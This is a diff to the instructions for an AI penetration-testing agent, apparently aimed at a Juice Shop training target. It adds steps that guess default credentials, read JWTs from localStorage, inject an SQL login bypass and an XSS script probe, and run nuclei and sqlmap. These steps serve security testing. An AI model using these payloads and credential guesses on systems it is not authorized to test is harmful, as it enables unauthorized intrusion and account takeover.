@@ -525,6 +525,21 @@ STEP 3 — LOAD each recommended playbook via load_playbook:
     flask_fastapi, go_web, aspnet, injection_vectors.
     Load multiple — each returns a full markdown body with probe recipes.
 
+STEP 3.5 — BROWSER RECON (do this for SPA targets — is_spa=true):
+    a) browser_navigate(url="<TARGET_URL>") → see the REAL rendered UI
+    b) browser_analyze_dom() → find login forms, API endpoints in JS,
+       hidden inputs, HTML comments (these are invisible to curl)
+    c) If login form found:
+       browser_fill_form(form_selector="form", fields={"email":"admin@juice-sh.op","password":"admin123"}, submit_selector="button[type=submit]")
+       Try default credentials: admin/admin, admin@admin.com/admin123,
+       test/test, guest/guest. Check cookies after each attempt.
+    d) browser_eval_js(expression="localStorage") → check for JWT tokens
+    e) After login: browser_navigate to admin pages, user profiles, etc.
+    f) browser_screenshot() for evidence of any vulnerability found
+
+    This step is CRITICAL for SPAs — they hide most of their attack
+    surface behind JavaScript rendering. curl only sees the shell HTML.
+
 STEP 4 — EXECUTE the probe recipe from the framework playbook:
     Copy the python_exec code block from the loaded playbook and run it,
     substituting <TARGET_URL> with your actual target. Example:
@@ -554,9 +569,19 @@ STEP 5 — REPORT findings, but VERIFY high/critical ones first:
     You can emit multiple verify_finding + report_finding calls in a
     SINGLE actions array (one response per hint pass).
 
-STEP 6 — After reporting the easy wins, load injection_vectors playbook
-    and run the SQLi response-length oracle on any REST endpoint you
-    discovered. Look for query-param size deltas.
+STEP 6 — DEEP EXPLOITATION after the easy wins:
+    a) Load injection_vectors playbook and run the SQLi response-length
+       oracle on REST endpoints. Look for query-param size deltas.
+    b) Try SQLi on login form via browser:
+       browser_fill_form(form_selector="form", fields={"email":"' OR 1=1--","password":"x"}, submit_selector="button[type=submit]")
+       Check if login succeeded (new cookies, redirected, different page).
+    c) Try XSS:
+       browser_navigate(url="<TARGET_URL>/search?q=<script>alert(1)</script>")
+       browser_eval_js(expression="document.querySelector('script[src*=alert]') ? 'XSS' : 'safe'")
+    d) Run nuclei for known CVEs:
+       shell_exec(command="nuclei -u <TARGET_URL> -t /root/.config/nuclei/templates/cves/ -silent -nc", timeout=120)
+    e) Run sqlmap on discovered endpoints:
+       shell_exec(command="sqlmap -u '<TARGET_URL>/api/endpoint?param=1' --batch --level=2 --risk=2 --output-dir=/tmp/sqlmap", timeout=180)
 
 STEP 7 — DO NOT call finish_scan until you have run at least 30
     iterations AND one of: (a) 5+ confirmed findings, or (b) you have
